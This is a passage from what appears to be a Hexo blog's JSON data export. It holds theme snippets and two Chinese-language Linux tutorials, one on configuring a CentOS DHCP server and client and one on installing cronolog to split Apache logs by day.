<!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>关于DHCP的配置是在很久之前学习配置的，并没有整理成册，今天闲下心来再把关于DHCP配置的方法回顾一下。</p>\n<h3 id=\"DHCP配置流程\"><a href=\"#DHCP配置流程\" class=\"headerlink\" title=\"DHCP配置流程\"></a>DHCP配置流程</h3><ol>\n<li>下载软件包</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y dhcp-server</span><br></pre></td></tr></table></figure>\n\n<p>从Centos8开始，关于DHCP的配置，软件包就变成了“dhcp-server”这是服务器端的软件包，与此相对应的还有客户端使用的“dhcp-client”。</p>","more":"<ol start=\"2\">\n<li>复制配置文件</li>\n</ol>\n<p>dhcp的配置文件是<code>/etc/dhcp/dhcpd.conf</code>，但是比较鸡肋的是，这个配置文件是空的，只有三行注释，但是dhcp提供了一个模板文件<code>/usr/share/doc/dhcp-server/dhcpd.conf.example</code>，可以直接拷贝过去使用。</p>\n<p>因为配置文件有很多注释，看起来非常杂乱，所以执行以下这条命令，直接带走所有注释。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">egrep -v <span class=\"string\">&quot;^#|^$&quot;</span> /usr/share/doc/dhcp-server/dhcpd.conf.example &gt; /etc/dhcp/dhcpd.conf</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>配置文件内容及含义</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 定义全局参数：默认搜索域</span></span><br><span class=\"line\">option domain-name <span class=\"string\">&quot;blog.nustarain.com&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\"># 定义全局参数：域名服务器（若是多个域名服务器使用逗号间隔）</span></span><br><span class=\"line\">option domain-name-servers ns1.nustarain.com;</span><br><span class=\"line\"><span class=\"comment\"># 定义全局参数：默认租期</span></span><br><span class=\"line\">default-lease-time 600;</span><br><span class=\"line\"><span class=\"comment\"># 定义全局参数。最大租期</span></span><br><span class=\"line\">max-lease-time 7200;</span><br><span class=\"line\">log-facility local7;</span><br><span class=\"line\"><span class=\"comment\"># 定义网络号为10.8.7.0子网掩码为255.255.255.0的子网</span></span><br><span class=\"line\">subnet 10.8.7.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">  <span class=\"comment\"># 子网IP地址池的范围</span></span><br><span class=\"line\">  range 10.8.7.10 10.8.7.253;</span><br><span class=\"line\">  <span class=\"comment\"># 设置子网的默认网关</span></span><br><span class=\"line\">  option routers 10.8.7.254;</span><br><span class=\"line\">  <span class=\"comment\"># 设置子网的广播地址</span></span><br><span class=\"line\">  option broadcast-address 10.8.7.255;</span><br><span class=\"line\">  default-lease-time 600;</span><br><span class=\"line\">  max-lease-time 7200;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"># 向特殊主机分配特定的IP，当要给多个特殊的主机分配IP时，host 后的名称要求必须唯一</span></span><br><span class=\"line\">host fantasia &#123;</span><br><span class=\"line\">  <span class=\"comment\"># 指定主机的MAC地址</span></span><br><span class=\"line\">  hardware ethernet 00:0c:29:af:33:58;</span><br><span class=\"line\">  <span class=\"comment\"># 指定要分配的IP地址</span></span><br><span class=\"line\">  fixed-address 10.8.7.68;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在整个DHCP的配置中，要注意DHCP配置文件的语法规则，尤其是分号的使用，稍不留神就会报错。<br>配置完配置文件之后，可以使用<code>dhcpd -t</code>来进行语法检查，出现下面的语句表示没有错误，反之就要检查错误了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Internet Systems Consortium DHCP Server 4.3.6</span><br><span class=\"line\">Copyright 2004-2017 Internet Systems Consortium.</span><br><span class=\"line\">All rights reserved.</span><br><span class=\"line\">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class=\"line\">ldap_gssapi_principal is not <span class=\"built_in\">set</span>,GSSAPI Authentication <span class=\"keyword\">for</span> LDAP will not be used</span><br><span class=\"line\">Not searching LDAP since ldap-server, ldap-port and ldap-base-dn were not specified <span class=\"keyword\">in</span> the config file</span><br><span class=\"line\">Config file: /etc/dhcp/dhcpd.conf</span><br><span class=\"line\">Database file: /var/lib/dhcpd/dhcpd.leases</span><br><span class=\"line\">PID file: /var/run/dhcpd.pid</span><br><span class=\"line\">Source compiled to use binary-leases</span><br></pre></td></tr></table></figure>\n\n<p>Please remember：Practice makes perfect.</p>\n<h3 id=\"客户机获取IP地址\"><a href=\"#客户机获取IP地址\" class=\"headerlink\" title=\"客户机获取IP地址\"></a>客户机获取IP地址</h3><p>相比服务器端的配置，客户机的操作就比较简单一点。</p>\n<ol>\n<li>下载软件包。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y dhcp-client</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><p>（可选），如果当前网卡已经是动态获取的模式，那么就不需要改配置文件了，如果网卡是静态指定的，那么就需要修改一下。网卡配置文件路径<code>/etc/sysconfig/network-scripts/ifcfg-ens160</code>，修改里面的<code>BOOTPROTO=dhcp</code>，保存退出。</p>\n</li>\n<li><p>执行命令更新重启网卡。</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart NetworkManager</span><br><span class=\"line\">nmcli c d ens160</span><br><span class=\"line\">nmcli c up ens160</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>相关命令。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dhclient ens160    <span class=\"comment\"># 自动获取IP地址</span></span><br><span class=\"line\">dhclient -r ens160    <span class=\"comment\"># 释放当前IP</span></span><br></pre></td></tr></table></figure>"},{"title":"cronolog 实现日志切割","date":"2023-12-10T05:57:21.000Z","_content":"\n### 为什么要进行日志切割\n\n日志切割是为了解决日志文件过大导致的一些问题，具体好处如下：\n\n* **控制日志文件大小**： 避免单个日志文件不断增大，占用过多磁盘空间。大日志文件不仅消耗磁盘空间，还可能导致文件系统性能下降。\n\n<!-- more -->\n\n* **方便管理和维护**： 日志切割可以将日志文件按照一定的规则划分成多个较小的文件，便于管理和维护。这样，每个日志文件都包含了特定时间范围或大小的日志，有助于快速定位和查找问题。\n\n* **避免日志文件过大导致的性能问题**： 当一个日志文件变得非常庞大时，对于日志分析工具或其他需要读取该文件的应用，可能会导致性能下降。切割日志文件可以降低读取和处理的负担。\n\n* **支持日志轮转**： 日志切割通常与日志轮转（log rotation）结合使用。日志轮转是指将旧的日志文件备份并可能删除，以便为新的日志文件腾出空间。这有助于保留最近的日志记录，同时控制总体日志文件数量。\n\n* **方便归档和备份**： 切割的日志文件可以更容易地进行归档和备份，因为每个文件的大小和时间范围都是可控的。\n\n* **提高日志的可读性**： 日志切割可以根据需要将日志文件按照不同的标准（例如按天、按大小）进行划分，使得每个文件包含的日志更加具有一致性，提高了日志的可读性和可搜索性。\n\n### 安装 cronolog 工具\n\n1. 下载源码包\n\n```bash\nwget https://files.cnblogs.com/files/crazyzero/cronolog-1.6.2.tar.gz\n```\n\n2. 解压并进入\n\n```bash\ntar -zxvf cronolog-1.6.2.tar.gz\ncd cronolog-1.6.2/\n```\n\n3. 编译安装\n\n```bash\n./configure \nmake\nmake install\n```\n\n4. 验证\n\n```bash\n[root@VM-0-10-centos sbin]# which cronolog\n/usr/local/sbin/cronolog\n```\n\n### 示例\n\n以对 Apache 进行日志切割进行演示，进入 Apache 主配置文件，更改`ErrorLog`和`CustomLog`两个选项。\n\n* 将`ErrorLog \"logs/error_log\"`注释，在下面加上一行\n\n```bash\nErrorLog \"|/usr/local/sbin/cronolog logs/error_%Y%m%d.log\"\n```\n\n效果如下：\n\n![ErrorLog](./cronolog/1.png)\n\n* 将`CustomLog \"logs/access_log\" combined`注释，在下面加上一行\n\n```bash\nCustomLog \"|/usr/local/sbin/cronolog logs/access_%Y%m%d.log\" combined\n```\n\n效果如下：\n\n![ErrorLog](./cronolog/2.png)\n\n### 验证\n\n配置完成之后，使用`httpd -t`检查 Apache 语法，检查无误，使用`apachectl graceful`重新启动服务。\n\n之后在`/var/log/httpd`目录下就可以看到例如 error_20231210.log 这样的 log 文件，然后使用 curl 命令或者浏览器重新访问网站就会自动生成 access_20231210.log 这样的文件。\n\n![ErrorLog](./cronolog/3.png)\n\n### 写在后面的话\n\n以上就可以实现访问日志和错误日志以天为单位进行切割保存，当然 cronolog 也支持按照小时进行切割，在双十一或者春运等特殊日期某访问量突然增多的情况下，可以按照小时进行切割。","source":"_posts/cronolog.md","raw":"---\ntitle: cronolog 实现日志切割\ndate: 2023-12-10 13:57:21\ncategories: 技术\ntags:\n  - Linux\n---\n\n### 为什么要进行日志切割\n\n日志切割是为了解决日志文件过大导致的一些问题，具体好处如下：\n\n* **控制日志文件大小**： 避免单个日志文件不断增大，占用过多磁盘空间。大日志文件不仅消耗磁盘空间，还可能导致文件系统性能下降。\n\n<!-- more -->\n\n* **方便管理和维护**： 日志切割可以将日志文件按照一定的规则划分成多个较小的文件，便于管理和维护。这样，每个日志文件都包含了特定时间范围或大小的日志，有助于快速定位和查找问题。\n\n* **避免日志文件过大导致的性能问题**： 当一个日志文件变得非常庞大时，对于日志分析工具或其他需要读取该文件的应用，可能会导致性能下降。切割日志文件可以降低读取和处理的负担。\n\n* **支持日志轮转**： 日志切割通常与日志轮转（log rotation）结合使用。日志轮转是指将旧的日志文件备份并可能删除，以便为新的日志文件腾出空间。这有助于保留最近的日志记录，同时控制总体日志文件数量。\n\n* **方便归档和备份**： 切割的日志文件可以更容易地进行归档和备份，因为每个文件的大小和时间范围都是可控的。\n\n* **提高日志的可读性**： 日志切割可以根据需要将日志文件按照不同的标准（例如按天、按大小）进行划分，使得每个文件包含的日志更加具有一致性，提高了日志的可读性和可搜索性。\n\n### 安装 cronolog 工具\n\n1. 下载源码包\n\n```bash\nwget https://files.cnblogs.com/files/crazyzero/cronolog-1.6.2.tar.gz\n```\n\n2. 解压并进入\n\n```bash\ntar -zxvf cronolog-1.6.2.tar.gz\ncd cronolog-1.6.2/\n```\n\n3. 编译安装\n\n```bash\n./configure \nmake\nmake install\n```\n\n4. 验证\n\n```bash\n[root@VM-0-10-centos sbin]# which cronolog\n/usr/local/sbin/cronolog\n```\n\n### 示例\n\n以对 Apache 进行日志切割进行演示，进入 Apache 主配置文件，更改`ErrorLog`和`CustomLog`两个选项。\n\n* 将`ErrorLog \"logs/error_log\"`注释，在下面加上一行\n\n```bash\nErrorLog \"|/usr/local/sbin/cronolog logs/error_%Y%m%d.log\"\n```\n\n效果如下：\n\n![ErrorLog](./cronolog/1.png)\n\n* 将`CustomLog \"logs/access_log\" combined`注释，在下面加上一行\n\n```bash\nCustomLog \"|/usr/local/sbin/cronolog logs/access_%Y%m%d.log\" combined\n```\n\n效果如下：\n\n![ErrorLog](./cronolog/2.png)\n\n### 验证\n\n配置完成之后，使用`httpd -t`检查 Apache 语法，检查无误，使用`apachectl graceful`重新启动服务。\n\n之后在`/var/log/httpd`目录下就可以看到例如 error_20231210.log 这样的 log 文件，然后使用 curl 命令或者浏览器重新访问网站就会自动生成 access_20231210.log 这样的文件。\n\n![ErrorLog](./cronolog/3.png)\n\n### 写在后面的话\n\n以上就可以实现访问日志和错误日志以天为单位进行切割保存，当然 cronolog 也支持按照小时进行切割，在双十一或者春运等特殊日期某访问量突然增多的情况下，可以按照小时进行切割。","slug":"cronolog","published":1,"updated":"2024-05-03T03:55:54.833Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5f6004v7zj34xe73bw8","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"为什么要进行日志切割\"><a href=\"#为什么要进行日志切割\" class=\"headerlink\" title=\"为什么要进行日志切割\"></a>为什么要进行日志切割</h3><p>日志切割是为了解决日志文件过大导致的一些问题，具体好处如下：</p>\n<ul>\n<li><strong>控制日志文件大小</strong>： 避免单个日志文件不断增大，占用过多磁盘空间。大日志文件不仅消耗磁盘空间，还可能导致文件系统性能下降。</li>\n</ul>\n<span id=\"more\"></span>\n\n<ul>\n<li><p><strong>方便管理和维护</strong>： 日志切割可以将日志文件按照一定的规则划分成多个较小的文件，便于管理和维护。这样，每个日志文件都包含了特定时间范围或大小的日志，有助于快速定位和查找问题。</p>\n</li>\n<li><p><strong>避免日志文件过大导致的性能问题</strong>： 当一个日志文件变得非常庞大时，对于日志分析工具或其他需要读取该文件的应用，可能会导致性能下降。切割日志文件可以降低读取和处理的负担。</p>\n</li>\n<li><p><strong>支持日志轮转</strong>： 日志切割通常与日志轮转（log rotation）结合使用。日志轮转是指将旧的日志文件备份并可能删除，以便为新的日志文件腾出空间。这有助于保留最近的日志记录，同时控制总体日志文件数量。</p>\n</li>\n<li><p><strong>方便归档和备份</strong>： 切割的日志文件可以更容易地进行归档和备份，因为每个文件的大小和时间范围都是可控的。</p>\n</li>\n<li><p><strong>提高日志的可读性</strong>： 日志切割可以根据需要将日志文件按照不同的标准（例如按天、按大小）进行划分，使得每个文件包含的日志更加具有一致性，提高了日志的可读性和可搜索性。</p>\n</li>\n</ul>\n<h3 id=\"安装-cronolog-工具\"><a href=\"#安装-cronolog-工具\" class=\"headerlink\" title=\"安装 cronolog 工具\"></a>安装 cronolog 工具</h3><ol>\n<li>下载源码包</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://files.cnblogs.com/files/crazyzero/cronolog-1.6.2.tar.gz</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>解压并进入</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -zxvf cronolog-1.6.2.tar.gz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> cronolog-1.6.2/</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>编译安装</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure </span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>验证</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-0-10-centos sbin]<span class=\"comment\"># which cronolog</span></span><br><span class=\"line\">/usr/local/sbin/cronolog</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><p>以对 Apache 进行日志切割进行演示，进入 Apache 主配置文件，更改<code>ErrorLog</code>和<code>CustomLog</code>两个选项。</p>\n<ul>\n<li>将<code>ErrorLog &quot;logs/error_log&quot;</code>注释，在下面加上一行</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ErrorLog <span class=\"string\">&quot;|/usr/local/sbin/cronolog logs/error_%Y%m%d.log&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>效果如下：</p>\n<p><img src=\"/2023/12/10/cronolog/1.png\" alt=\"ErrorLog\"></p>\n<ul>\n<li>将<code>CustomLog &quot;logs/access_log&quot; combined</code>注释，在下面加上一行</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CustomLog <span class=\"string\">&quot;|/usr/local/sbin/cronolog logs/access_%Y%m%d.log&quot;</span> combined</span><br></pre></td></tr></table></figure>\n\n<p>效果如下：</p>\n<p><img src=\"/2023/12/10/cronolog/2.png\" alt=\"ErrorLog\"></p>\n<h3 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h3><p>配置完成之后，使用<code>httpd -t</code>检查 Apache 语法，检查无误，使用<code>apachectl graceful</code>重新启动服务。</p>\n<p>之后在<code>/var/log/httpd</code>目录下就可以看到例如 error_20231210.log 这样的 log 文件，然后使用 curl 命令或者浏览器重新访问网站就会自动生成 access_20231210.log 这样的文件。</p>\n<p><img src=\"/2023/12/10/cronolog/3.png\" alt=\"ErrorLog\"></p>\n<h3 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h3><p>以上就可以实现访问日志和错误日志以天为单位进行切割保存，当然 cronolog 也支持按照小时进行切割，在双十一或者春运等特殊日期某访问量突然增多的情况下，可以按照小时进行切割。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"为什么要进行日志切割\"><a href=\"#为什么要进行日志切割\" class=\"headerlink\" title=\"为什么要进行日志切割\"></a>为什么要进行日志切割</h3><p>日志切割是为了解决日志文件过大导致的一些问题，具体好处如下：</p>\n<ul>\n<li><strong>控制日志文件大小</strong>： 避免单个日志文件不断增大，占用过多磁盘空间。大日志文件不仅消耗磁盘空间，还可能导致文件系统性能下降。</li>\n</ul>","more":"<ul>\n<li><p><strong>方便管理和维护</strong>： 日志切割可以将日志文件按照一定的规则划分成多个较小的文件，便于管理和维护。这样，每个日志文件都包含了特定时间范围或大小的日志，有助于快速定位和查找问题。</p>\n</li>\n<li><p><strong>避免日志文件过大导致的性能问题</strong>： 当一个日志文件变得非常庞大时，对于日志分析工具或其他需要读取该文件的应用，可能会导致性能下降。切割日志文件可以降低读取和处理的负担。</p>\n</li>\n<li><p><strong>支持日志轮转</strong>： 日志切割通常与日志轮转（log rotation）结合使用。日志轮转是指将旧的日志文件备份并可能删除，以便为新的日志文件腾出空间。这有助于保留最近的日志记录，同时控制总体日志文件数量。</p>\n</li>\n<li><p><strong>方便归档和备份</strong>： 切割的日志文件可以更容易地进行归档和备份，因为每个文件的大小和时间范围都是可控的。</p>\n</li>\n<li><p><strong>提高日志的可读性</strong>： 日志切割可以根据需要将日志文件按照不同的标准（例如按天、按大小）进行划分，使得每个文件包含的日志更加具有一致性，提高了日志的可读性和可搜索性。</p>\n</li>\n</ul>\n<h3 id=\"安装-cronolog-工具\"><a href=\"#安装-cronolog-工具\" class=\"headerlink\" title=\"安装 cronolog 工具\"></a>安装 cronolog 工具</h3><ol>\n<li>下载源码包</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://files.cnblogs.com/files/crazyzero/cronolog-1.6.2.tar.gz</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>解压并进入</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -zxvf cronolog-1.6.2.tar.gz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> cronolog-1.6.2/</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>编译安装</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure </span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>验证</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-0-10-centos sbin]<span class=\"comment\"># which cronolog</span></span><br><span class=\"line\">/usr/local/sbin/cronolog</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><p>以对 Apache 进行日志切割进行演示，进入 Apache 主配置文件，更改<code>ErrorLog</code>和<code>CustomLog</code>两个选项。</p>\n<ul>\n<li>将<code>ErrorLog &quot;logs/error_log&quot;</code>注释，在下面加上一行</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ErrorLog <span class=\"string\">&quot;|/usr/local/sbin/cronolog logs/error_%Y%m%d.log&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>效果如下：</p>\n<p><img src=\"/2023/12/10/cronolog/1.png\" alt=\"ErrorLog\"></p>\n<ul>\n<li>将<code>CustomLog &quot;logs/access_log&quot; combined</code>注释，在下面加上一行</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CustomLog <span class=\"string\">&quot;|/usr/local/sbin/cronolog logs/access_%Y%m%d.log&quot;</span> combined</span><br></pre></td></tr></table></figure>\n\n<p>效果如下：</p>\n<p><img 